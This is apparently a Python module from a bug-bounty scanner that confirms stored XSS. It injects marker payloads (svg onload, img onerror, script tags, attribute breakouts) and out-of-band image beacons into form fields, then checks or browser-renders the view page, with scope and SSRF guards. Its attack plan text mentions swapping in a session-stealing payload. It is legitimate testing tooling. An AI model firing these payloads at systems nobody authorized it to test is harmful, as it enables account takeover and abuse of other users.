"""GreyIQ BugHunter — stored (persistent) XSS confirmation.

Confirms a marker payload SUBMITTED on one request and RENDERED UNESCAPED on a DIFFERENT
'view' page — true stored XSS, distinct from the reflected check (same response). Honest +
GET-by-default:

  * **Assisted (default, GET-only):** GreyIQ mints a unique marker payload; you submit it via
    your own form/tooling, then GreyIQ GETs the view URL and confirms whether the raw
    executable tag rendered.
  * **Auto (opt-in ``send``):** GreyIQ POSTs the marker into the form field itself — a guarded,
    scope-bound, no-redirect form POST (the engine's second non-GET egress, like the XXE
    ``--send``) — then GETs the view URL.

A confirmed match is OUR OWN unique marker payload appearing RAW in the view page, so the
proof embeds only our marker, never another user's data. View + inject URLs are scope-bound
+ SSRF-guarded; the operator's session (cookie/headers) is attached to both if supplied.
"""

from __future__ import annotations

import html as _html
import secrets as _secrets
import time
import urllib.error
import urllib.request
from typing import Any
from urllib.parse import urlencode, urlparse

from bughunter.active_verify_service import _ActiveError, _Http, _NoRedirect, host_in_active_scope
from bughunter.oob_service import _is_crawler_ua, callback_url, mint_token, poll_collaborator
from bughunter.playwright_env import ensure_bundled_browsers_path
from bughunter.rate_limit import HostRateGovernor
from bughunter.scan_auth import auth_headers_for, build_auth
from bughunter.settings import get_settings
from bughunter.web_ingest import WebsiteFetchError, guarded_dns_scope, normalize_website_url
from bughunter.web_scan_service import _USER_AGENT, _guard_url, current_user_agent, playwright_request_allowed


def mint_marker() -> str:
    """A unique, unguessable marker so a raw-payload match on the view page is attributable."""
    return "gqsx" + _secrets.token_hex(8)


def build_payloads(marker: str) -> dict[str, str]:
    """Stored-XSS payload variants, each carrying the unique marker. If one renders RAW on the
    view page, the executable tag fires — that's the confirmation."""
    return {
        "svg": f"<svg/onload=alert(1)>{marker}</svg>",
        "img": f"<img src=x onerror=alert(1)>{marker}",
        "script": f"<script>/*{marker}*/alert(1)</script>",
        "breakout": f'"><svg/onload=alert(1)>{marker}',
    }


def _fetch_view(url: str, *, auth: Any, settings: Any) -> dict[str, Any]:
    governor = HostRateGovernor(capacity=settings.active_max_requests_per_host,
                                min_interval_s=settings.active_min_interval_ms / 1000.0)
    return _Http(settings, governor, max_requests=2, auth=auth).fetch(url)


def _post_form(url: str, data: dict[str, str], *, auth: Any, timeout: float) -> dict[str, Any]:
    """POST a form body to an ALREADY scope-checked + SSRF-guarded URL, no redirect followed.
    The operator's session is attached if present. Reached only via the opt-in ``send``."""
    headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": current_user_agent(_USER_AGENT), "Accept": "*/*"}
    # Attach the operator session ONLY when the POST host is same-site as the host the
    # credentials were bound to — same invariant the GET path (_Http.fetch) enforces. The
    # inject URL is scope-checked independently and may be a DIFFERENT in-scope host, so a
    # raw header copy would leak the session off-target on the strictest (non-GET) egress.
    headers.update(auth_headers_for(urlparse(url).hostname or "", auth))
    request = urllib.request.Request(url, data=urlencode(data).encode("utf-8"), method="POST", headers=headers)
    opener = urllib.request.build_opener(_NoRedirect())
    try:
        with opener.open(request, timeout=timeout) as resp:
            return {"ok": True, "status": getattr(resp, "status", 0)}
    except urllib.error.HTTPError as exc:
        return {"ok": True, "status": exc.code}
    except (urllib.error.URLError, OSError, ValueError) as exc:
        return {"ok": False, "error": f"form POST failed: {exc}"}


def _build_finding(view_url: str, inject_url: str, field: str, kind: str, marker: str) -> tuple[dict[str, Any], dict[str, Any]]:
    path = urlparse(view_url).path or "/"
    matched = (f"the injected {kind} payload (unique marker {marker}) rendered UNESCAPED on the view page — the "
               f"executable tag is served raw, so it runs in every viewer's browser")
    finding = {
        "rule_id": "active.stored-xss",
        "title": f"Stored XSS rendered at {path}",
        "severity": "high",
        "confidence": "high",
        "category": "client_sink",
        "location": view_url,
        "file_path": view_url,
        "line_start": 1, "line_end": 1,
        "class_id": "xss", "class_name": "Stored / persistent XSS",
        "cwe": "CWE-79",
        "owasp": "A03:2021 Injection",
        "vrt": "",
        "references": [
            "https://owasp.org/www-community/attacks/xss/",
            "https://portswigger.net/web-security/cross-site-scripting/stored",
        ],
        "remediation": ("Context-encode all stored user input on output (HTML-entity-encode), prefer a safe templating "
                        "auto-escape, sanitize rich HTML server-side (allow-list), and apply a strict CSP."),
        # The marker payload is OURS (not another user's data) — safe to name as proof.
        "snippet": "",
        "proof_evidence": {
            "request_line": (f"POST {inject_url} ({field}=<payload>)  then  GET {view_url}" if inject_url
                             else f"GET {view_url}  (payload submitted out-of-band)"),
            "response_status": "200 with the raw payload rendered",
            "matched_value": matched,
        },
    }
    plan = {
        "steps": [
            (f"Submit the payload into the '{field}' field at {inject_url}." if inject_url
             else "Submit the marker payload into the target field via the app."),
            f"Load the view page where that content is shown: GET {view_url}",
            f"Observe the raw {kind} payload (marker {marker}) in the page source — it executes for every viewer (stored XSS).",
            "Assess the blast radius: who views this content (other users / admins) and what a session-stealing payload reaches.",
        ],
        "poc": f"# After submitting the payload, the view page returns it raw:\n# GET {view_url}\n# -> ...{build_payloads(marker)[kind]}...",
        "impact": ("Stored XSS executes attacker JavaScript in the browser of everyone who views the content — session "
                   "theft, account takeover, and actions performed as the victim, with no per-victim interaction needed."),
        "cvss": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N", "base_score": 8.0, "base_severity": "high",
            "estimated": False,
            "justification": (
                f"Actively confirmed: a unique marker payload ({marker}) was submitted and observed rendering "
                "UNESCAPED on a separate view — not a template estimate."
            ),
        },
        "remediation": finding["remediation"],
        "proof_of_impact": {
            "status": "confirmed",
            "method": "marker payload submitted, then rendered RAW on a different view page (GET) — our own marker, no other user's data",
            "actor": "any user who can submit this content",
            "affected_asset": "every user (and admin) who views the stored content",
            "observed_result": matched,
            "control_result": "an escaped/encoded output would show the marker as inert text (&lt;svg…), not a live tag",
            "evidence": f"the raw {kind} payload bearing marker {marker} is present in the view page source",
        },
    }
    return finding, plan


def _verdict(body: str, payloads: dict[str, str], marker: str, view_url: str,
             inject_url: str, field: str) -> dict[str, Any]:
    body = body or ""
    for kind, payload in payloads.items():
        if payload in body:   # the RAW executable payload rendered -> stored XSS
            finding, plan = _build_finding(view_url, inject_url, field, kind, marker)
            finding["ref"] = "F1"
            return {"ok": True, "status": "confirmed", "marker": marker, "finding": finding,
                    "attack_plan": plan, "detail": {"view_url": view_url, "inject_url": inject_url,
                                                     "field": field, "payload_kind": kind}}
    if marker in body or _html.escape(marker) in body:
        return {"ok": True, "status": "escaped", "marker": marker,
                "reason": "the marker is stored but HTML-escaped on the view page — not exploitable as XSS here."}
    return {"ok": True, "status": "not-stored", "marker": marker,
            "reason": "the marker did not appear on the view page — it wasn't stored, or it renders on a different page."}


def confirm_stored_xss(
    *,
    view_url: str,
    inject_url: str = "",
    field: str = "",
    scope: str = "",
    send: bool = False,
    marker: str | None = None,
    cookie: str = "",
    headers: list[str] | None = None,
    settings: Any = None,
) -> dict[str, Any]:
    """Confirm stored XSS. Assisted by default (mint a marker payload, hand it back to submit,
    then re-call with the marker to check the view URL). ``send=True`` opts in to GreyIQ POSTing
    the payload into ``field`` at ``inject_url`` itself, then checking the view URL."""
    settings = settings or get_settings()
    if not str(view_url or "").strip():
        return {"ok": False, "error": "Provide the view URL where the stored content is displayed."}
    try:
        nview = normalize_website_url(view_url)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": str(exc)}
    vhost = urlparse(nview).hostname or ""
    if not host_in_active_scope(vhost, scope, settings):
        return {"ok": False, "error": f"'{vhost}' is not named in your scope — stored-XSS testing is fail-closed."}
    try:
        sview = _guard_url(nview, settings.allow_private_urls, settings.web_allowed_ports)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": f"view URL refused by the guard: {exc}"}
    auth = build_auth(sview, cookie=cookie or "", headers=headers or [])

    fresh = not str(marker or "").strip()
    marker = str(marker or "").strip() or mint_marker()
    payloads = build_payloads(marker)

    if send:
        if not str(inject_url or "").strip() or not str(field or "").strip():
            return {"ok": False, "error": "Auto-send needs both the inject_url (the form endpoint) and the field name."}
        try:
            ninj = normalize_website_url(inject_url)
            ihost = urlparse(ninj).hostname or ""
            if not host_in_active_scope(ihost, scope, settings):
                return {"ok": False, "error": f"'{ihost}' (inject URL) is not in scope — fail-closed."}
            sinj = _guard_url(ninj, settings.allow_private_urls, settings.web_allowed_ports)
        except WebsiteFetchError as exc:
            return {"ok": False, "error": f"inject URL refused by the guard: {exc}"}
        try:
            pre = _fetch_view(sview, auth=auth, settings=settings)
        except _ActiveError as exc:
            return {"ok": False, "error": f"view fetch failed: {exc}"}
        if marker in (pre.get("body") or ""):
            return {"ok": False, "error": "the fresh marker already appears on the view page — mint another and retry."}
        # Re-validate + pin the DNS resolution IMMEDIATELY before the real POST (rather
        # than relying on the guard check higher up, before the pre-probe view fetch
        # above) so an attacker-controlled DNS server can't rebind the inject-URL
        # hostname to a private/metadata IP in that gap. See web_ingest.guarded_dns_scope().
        with guarded_dns_scope():
            try:
                _guard_url(sinj, settings.allow_private_urls, settings.web_allowed_ports)
            except WebsiteFetchError as exc:
                return {"ok": False, "error": f"inject URL refused by the guard: {exc}"}
            post = _post_form(sinj, {field: payloads["svg"]}, auth=auth, timeout=settings.web_fetch_timeout_seconds)
        if not post.get("ok"):
            return {"ok": True, "status": "send-failed", "marker": marker, "payloads": payloads, "error": post.get("error")}
        try:
            res = _fetch_view(sview, auth=auth, settings=settings)
        except _ActiveError as exc:
            return {"ok": False, "error": f"view fetch failed: {exc}"}
        return _verdict(res.get("body") or "", {"svg": payloads["svg"]}, marker, sview, sinj, field)

    # Assisted mode.
    if fresh:
        return {"ok": True, "status": "ready", "marker": marker, "payloads": payloads,
                "view_url": sview, "inject_url": inject_url, "field": field,
                "reason": (f"Submit one of these payloads into the target field (each carries the marker {marker}), then "
                           f"re-run with marker={marker} to check whether it rendered unescaped at {sview}.")}
    try:
        res = _fetch_view(sview, auth=auth, settings=settings)
    except _ActiveError as exc:
        return {"ok": False, "error": f"view fetch failed: {exc}"}
    return _verdict(res.get("body") or "", payloads, marker, sview, inject_url, field)


# --- OOB-beacon stored XSS: prove the injected markup EXECUTES in a browser render ------------------
# The raw-marker check above proves the payload is served unescaped in the view's HTML *source*. The
# beacon variant proves the stronger, dynamic fact — the injected markup runs when a browser RENDERS
# the view — and catches DOM/JS-rendered stored XSS a source fetch misses. We inject an
# `<img src=collaborator-token>` beacon, render the view in headless Chromium (every sub-resource
# request is SSRF-route-guarded), and a collaborator hit for the fresh, previously-empty token proves
# the stored `<img>` was live HTML (an escaped output would render it as inert text and fire nothing).
def _beacon_payloads(cb: str, marker: str) -> dict[str, str]:
    """Beacon payload variants — each does NOTHING but request the operator-controlled collaborator
    callback (no cookie theft, no DOM change beyond the beacon), so running it is benign."""
    return {
        "img": f'<img src="{cb}">{marker}',
        "img_onerror": f'<img src=x onerror="new Image().src=\'{cb}\'">{marker}',
        "svg": f'<svg><image href="{cb}"/></svg>{marker}',
    }


def _beacon_route_headers(req_url: str, req_headers: dict[str, str], auth: Any) -> dict[str, str] | None:
    """The headers a beacon-render sub-request should carry: the operator's bound session merged onto the
    request's existing headers ONLY when the request host is same-site as the credentials; ``None`` off-
    site (leave the request untouched). This is the same-site boundary that keeps the operator session
    off any cross-origin host the (attacker-controlled) stored markup references — a browser render must
    NEVER attach auth context-wide. Module-level so the boundary is directly unit-tested."""
    add = auth_headers_for(urlparse(req_url).hostname or "", auth)
    if not add:
        return None
    return {**dict(req_headers or {}), **{k.lower(): v for k, v in add.items()}}


def _render_beacon(url: str, *, cookie: str, headers: list[str] | None, scope: str,
                   settings: Any, wait_seconds: float = 4.0) -> dict[str, Any]:
    """Render ``url`` in a headless browser so a stored ``<img src=beacon>`` actually fires its request.
    SSRF-route-guarded (private/metadata hosts blocked, the public collaborator allowed); the operator's
    session is attached so the stored content shows; scope re-checked after navigation. Playwright-lazy.
    Returns ``{ok, final_url}`` or ``{ok: False, error}`` — never raises for the common failures. Module-
    level so tests can substitute it without a real browser."""
    ensure_bundled_browsers_path()
    try:
        from playwright.sync_api import sync_playwright
    except Exception:  # noqa: BLE001 - optional dependency
        return {"ok": False, "error": "Playwright/Chromium is unavailable — use assisted mode, or install it to run the beacon render."}

    # Bind the operator's session (cookie + headers) to the view host; auth_headers_for() then releases
    # it ONLY to same-site requests inside the route guard below.
    auth = build_auth(url, cookie=cookie or "", headers=headers or [])

    def _guard_route(route: Any) -> None:
        # Every request the render makes (the view, its sub-resources, AND the beacon) is guarded: a
        # private/metadata host is aborted; the public collaborator + in-scope view host are allowed.
        req = route.request
        if not playwright_request_allowed(req.url, settings.allow_private_urls, settings.web_allowed_ports):
            route.abort()
            return
        # The operator's session rides ONLY same-site requests — NEVER context-wide (Playwright's
        # set_extra_http_headers would leak Authorization/Cookie to every cross-origin sub-resource the
        # attacker-controlled stored markup references). _beacon_route_headers returns None off-site, so a
        # beacon/CDN/redirect to a public attacker host receives no credentials. Mirrors _post_form/_Http.
        merged = _beacon_route_headers(req.url, req.headers, auth)
        if merged is not None:
            route.continue_(headers=merged)
        else:
            route.continue_()

    wait_ms = int(max(0.0, wait_seconds) * 1000)
    try:
        with sync_playwright() as playwright:
            browser = playwright.chromium.launch(headless=True)
            # Carry the app signature + the program's mandatory marker (see screenshot_service). This
            # path renders the stored payload back, so its traffic is in-scope and must be attributable.
            context = browser.new_context(
                ignore_https_errors=True, user_agent=current_user_agent(_USER_AGENT)
            )
            context.route("**/*", _guard_route)
            page = context.new_page()
            page.goto(url, wait_until="load", timeout=wait_ms + 15000)
            page.wait_for_timeout(wait_ms)   # let stored <img>/<svg> beacons fire
            final_url = page.url
            browser.close()
    except Exception as exc:  # noqa: BLE001 - navigation/timeout -> inconclusive, never fatal
        return {"ok": False, "error": f"render failed: {exc}"}
    final_host = urlparse(final_url).hostname or ""
    if not host_in_active_scope(final_host, scope, settings):
        return {"ok": False, "error": f"render navigation left scope (ended at '{final_host}')."}
    return {"ok": True, "final_url": final_url}


def _build_beacon_finding(view_url: str, inject_url: str, field: str, token: str,
                          hit: dict[str, Any], confirmed: bool = True) -> tuple[dict[str, Any], dict[str, Any]]:
    path = urlparse(view_url).path or "/"
    ua = (hit.get("headers") or {}).get("user-agent", "?")
    observed = (f"the injected <img> beacon (token {token}) fired an out-of-band request when the view page "
                f"was rendered in a browser — the stored markup runs as live HTML, not inert text")
    finding = {
        "rule_id": "active.stored-xss-beacon",
        "title": f"Stored XSS executes on render at {path}",
        "severity": "high", "confidence": "high" if confirmed else "medium",
        "category": "client_sink",
        "location": view_url, "file_path": view_url, "line_start": 1, "line_end": 1,
        "class_id": "xss", "class_name": "Stored / persistent XSS (out-of-band beacon)",
        "cwe": "CWE-79", "owasp": "A03:2021 Injection", "vrt": "",
        "references": [
            "https://owasp.org/www-community/attacks/xss/",
            "https://portswigger.net/web-security/cross-site-scripting/stored",
        ],
        "remediation": ("Context-encode all stored user input on output, prefer an auto-escaping template, "
                        "sanitize rich HTML server-side (allow-list), and apply a strict CSP."),
        "snippet": "",  # the proof is the collaborator callback, not page/user data
        "proof_evidence": {
            "request_line": (f"POST {inject_url} ({field}=<img src=collaborator>)  then render  {view_url}" if inject_url
                             else f"render {view_url}  (beacon submitted out-of-band)"),
            "response_status": f"collaborator hit: {hit.get('method', 'GET')} {hit.get('path', '/oob/' + token)}",
            "matched_value": (f"a browser rendering {view_url} fetched the injected beacon for token {token} "
                              f"(source {hit.get('ip', '?')}, UA {ua}) — "
                              + ("stored XSS confirmed (the fresh token was empty before injection)" if confirmed
                                 else "but the callback source looks like a crawler/preview bot; verify before submitting")),
        },
    }
    plan = {
        "steps": [
            (f"Submit an <img src=<your collaborator>> payload into the '{field}' field at {inject_url}." if inject_url
             else "Submit an <img src=<your collaborator>> beacon payload into the target field."),
            f"Open the page that renders that content in a browser: {view_url}",
            f"Observe an inbound hit on your collaborator for token {token} — the stored <img> was served as live "
            "HTML and the browser fetched it, so the markup executes for every viewer (stored XSS).",
            "Swap the beacon for a session-stealing payload (in a real assessment) to map the blast radius: who "
            "views this content (other users / admins) and what their session reaches.",
        ],
        "poc": (f"# Inject into {field or '<field>'} at {inject_url or '<inject_url>'}:\n"
                f'<img src="{callback_url("<your-collaborator>", token)}">\n'
                f"# then render {view_url} in a browser -> out-of-band callback for token {token}"),
        "impact": ("Stored XSS executes attacker JavaScript in the browser of everyone who views the content — "
                   "session theft, account takeover, and actions performed as the victim, with no per-victim "
                   "interaction beyond viewing the page."),
        "cvss": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N", "base_score": 8.0, "base_severity": "high",
            "estimated": not confirmed,
            "justification": (
                f"Actively confirmed: an injected beacon (token {token}) fired an out-of-band request from a real "
                "browser render of the view page — not a template estimate." if confirmed else
                "The callback source looks like a crawler/preview bot rather than the render — confirm before treating as proven."
            ),
        },
        "remediation": finding["remediation"],
        "proof_of_impact": {
            "status": "confirmed" if confirmed else "candidate",
            "method": "injected <img> beacon, then a headless-browser render of the view fired an out-of-band callback — our own beacon, no page/user data read",
            "actor": "any user who can submit this content",
            "affected_asset": "every user (and admin) whose browser renders the stored content",
            "observed_result": observed,
            "control_result": "the fresh collaborator token recorded nothing before injection; an escaped/encoded output would render the <img> as inert text and fire no request",
            "evidence": f"collaborator interaction for token {token} ({hit.get('method', 'GET')} {hit.get('path', '')})",
        },
    }
    return finding, plan


def confirm_stored_xss_beacon(
    *,
    view_url: str,
    inject_url: str = "",
    field: str = "",
    base: str,
    secret: str,
    scope: str = "",
    send: bool = False,
    token: str | None = None,
    cookie: str = "",
    headers: list[str] | None = None,
    settings: Any = None,
    poll_attempts: int = 4,
    poll_delay_s: float = 2.0,
    wait_seconds: float = 4.0,
) -> dict[str, Any]:
    """Confirm stored XSS via an OOB collaborator beacon rendered in a browser. Two modes, mirroring
    the XXE/SSRF OOB provers:

      * **Assisted (default):** mint a fresh token, hand back ``<img src=callback>`` beacon payloads to
        submit out of band, then re-call with the SAME ``token`` to render the view + poll.
      * **Auto (``send=True``):** GreyIQ POSTs the beacon into ``field`` at ``inject_url`` (guarded,
        scope-bound, no-redirect), renders the view in headless Chromium, and polls the collaborator.

    A hit for the fresh (pre-injection empty) token proves the stored markup executed on render. A
    crawler/preview-bot callback source downgrades to candidate. Scope-gated + SSRF-guarded throughout;
    fails closed."""
    settings = settings or get_settings()
    if not str(base or "").strip() or not str(secret or "").strip():
        return {"ok": False, "error": "Configure the OOB collaborator URL + secret first."}
    if not str(view_url or "").strip():
        return {"ok": False, "error": "Provide the view URL where the stored content renders."}
    try:
        nview = normalize_website_url(view_url)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": str(exc)}
    vhost = urlparse(nview).hostname or ""
    if not host_in_active_scope(vhost, scope, settings):
        return {"ok": False, "error": f"'{vhost}' is not named in your scope — stored-XSS testing is fail-closed."}
    try:
        sview = _guard_url(nview, settings.allow_private_urls, settings.web_allowed_ports)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": f"view URL refused by the guard: {exc}"}

    fresh = not str(token or "").strip()
    token = str(token or "").strip() or mint_token()
    cb = callback_url(base, token)
    payloads = _beacon_payloads(cb, token)

    def _poll_then_verdict(sinj: str) -> dict[str, Any]:
        errors: list[str] = []
        for _ in range(max(1, poll_attempts)):
            time.sleep(max(0.0, poll_delay_s))
            res = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
            if not res.get("ok"):
                errors.append(res.get("error", "poll failed"))
                break
            if res.get("count"):
                hit = (res.get("hits") or [{}])[0]
                confirmed = not _is_crawler_ua((hit.get("headers") or {}).get("user-agent", ""))
                finding, plan = _build_beacon_finding(sview, sinj, field, token, hit, confirmed)
                finding["ref"] = "F1"
                # Active-proof carriers so a hunt/report renders this CONFIRMED off the captured
                # collaborator differential (mirrors the SSRF/XXE OOB findings).
                finding["_active_class_hint"] = "xss"
                finding["_active_proof"] = plan["proof_of_impact"]
                finding["_active_cvss"] = plan["cvss"]
                return {"ok": True, "status": "confirmed" if confirmed else "candidate", "token": token,
                        "finding": finding, "attack_plan": plan,
                        "detail": {"hit": hit, "view_url": sview, "inject_url": sinj, "field": field,
                                   "negative_control": "the fresh token was empty before injection"}}
        return {"ok": True, "status": "no-callback", "token": token, "payloads": payloads, "poll_errors": errors,
                "reason": "no out-of-band callback was observed after rendering the view — the beacon did not fire (no stored XSS proven here)."}

    if send:
        if not str(inject_url or "").strip() or not str(field or "").strip():
            return {"ok": False, "error": "Auto-send needs both the inject_url (the form endpoint) and the field name."}
        try:
            ninj = normalize_website_url(inject_url)
            ihost = urlparse(ninj).hostname or ""
            if not host_in_active_scope(ihost, scope, settings):
                return {"ok": False, "error": f"'{ihost}' (inject URL) is not in scope — fail-closed."}
            sinj = _guard_url(ninj, settings.allow_private_urls, settings.web_allowed_ports)
        except WebsiteFetchError as exc:
            return {"ok": False, "error": f"inject URL refused by the guard: {exc}"}
        # Negative control: the fresh token MUST be empty before we inject, else a later hit can't be
        # attributed to our beacon.
        pre = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
        if not pre.get("ok"):
            return {"ok": False, "error": pre.get("error", "collaborator poll failed")}
        if pre.get("count"):
            return {"ok": False, "error": "the fresh collaborator token already has hits before the probe — mint a fresh one and retry."}
        auth = build_auth(sview, cookie=cookie or "", headers=headers or [])
        # Re-validate + pin DNS immediately before the POST (rebind guard), like the marker path.
        with guarded_dns_scope():
            try:
                _guard_url(sinj, settings.allow_private_urls, settings.web_allowed_ports)
            except WebsiteFetchError as exc:
                return {"ok": False, "error": f"inject URL refused by the guard: {exc}"}
            post = _post_form(sinj, {field: payloads["img"]}, auth=auth, timeout=settings.web_fetch_timeout_seconds)
        if not post.get("ok"):
            return {"ok": True, "status": "send-failed", "token": token, "payloads": payloads, "error": post.get("error")}
        render = _render_beacon(sview, cookie=cookie, headers=headers, scope=scope, settings=settings, wait_seconds=wait_seconds)
        if not render.get("ok"):
            return {"ok": True, "status": "render-failed", "token": token, "payloads": payloads, "error": render.get("error")}
        return _poll_then_verdict(sinj)

    # Assisted mode.
    if fresh:
        return {"ok": True, "status": "ready", "token": token, "payloads": payloads, "callback_url": cb,
                "view_url": sview, "inject_url": inject_url, "field": field,
                "reason": (f"Submit one of these beacon payloads into the target field, then re-run with token={token} "
                           f"to render {sview} and poll for the callback (or pass send=True to have GreyIQ do it).")}
    # Re-render + re-poll a token the operator already injected (its negative control was the fresh mint).
    render = _render_beacon(sview, cookie=cookie, headers=headers, scope=scope, settings=settings, wait_seconds=wait_seconds)
    if not render.get("ok"):
        return {"ok": True, "status": "render-failed", "token": token, "payloads": payloads, "error": render.get("error")}
    return _poll_then_verdict(inject_url)
